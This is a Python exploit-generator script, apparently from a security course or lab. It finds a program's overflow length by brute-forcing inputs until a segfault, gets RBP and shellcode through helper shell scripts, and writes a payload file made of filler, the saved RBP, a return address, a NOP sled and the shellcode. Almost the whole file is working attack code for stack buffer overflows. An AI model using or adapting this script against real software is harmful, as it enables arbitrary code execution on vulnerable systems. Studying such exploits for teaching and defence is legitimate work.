#!/usr/bin/python3

#imports
from subprocess import Popen, PIPE
import struct
import sys

# Used to get buffer length by brute force. Run untill segment fault is observed.
def get_buff_len(program):
	buff_len = -1
	for i in range(1, 1024):											# Max test = 1024
		p = Popen([program, "-"], stdin=PIPE, stdout=PIPE, stderr=PIPE)	# run the program
		p.communicate(input=("a"*i).encode())							# input to buffer for checking
		if p.returncode == -11:											# Segment fault
			buff_len = i
			break
	if buff_len == -1:													# Not reached segment fault
		raise Exception("Can not overflow buffer")
	return buff_len - 8													# -8 to accomodate for rbp register. refer to: https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64


# Used to find RBP using the shell script. (check the script for working)
def find_rbp(program, function):
	p = Popen(["./get_rbp.sh", program, function, "-"], stdin=PIPE, stdout=PIPE, stderr=PIPE)
	stdout = p.communicate()[0]
	return int(stdout, 0)

# Used to get shellcode using the shell script. (check the script for working)
def get_shellcode(program):
	p = Popen(["./get_shellcode.sh", program], stdin=PIPE, stdout=PIPE, stderr=PIPE)
	stdout = str(p.communicate()[0])[2:-3].replace("\\\\x", "")
	return bytes.fromhex(stdout)


if __name__ == "__main__":
	buff_len = get_buff_len(sys.argv[1])			# get buffer length
	RBP_int = find_rbp(sys.argv[1], sys.argv[2])	# get RBP in int
	
	buffer = b"\x41" * (buff_len)					# Fill the buffer
	RBP = RBP_int.to_bytes(8, "little")				# Convert rbp to little endian
	ret_addr = (RBP_int + 256).to_bytes(8, "little")# get return address, RBP + 256, to accomodate env
	NOP = b"\x90" * (512)							# No operations, 512 to accomodate env
	shellcode = get_shellcode(sys.argv[3])			# Get shellcode
	
	# Write the payload
	f = open(sys.argv[4], "wb")			
	f.write(buffer + RBP + ret_addr + NOP + shellcode) # first fill the buffer, then rbp, then return address, then nops and finally shellcode
	f.close()
	
	
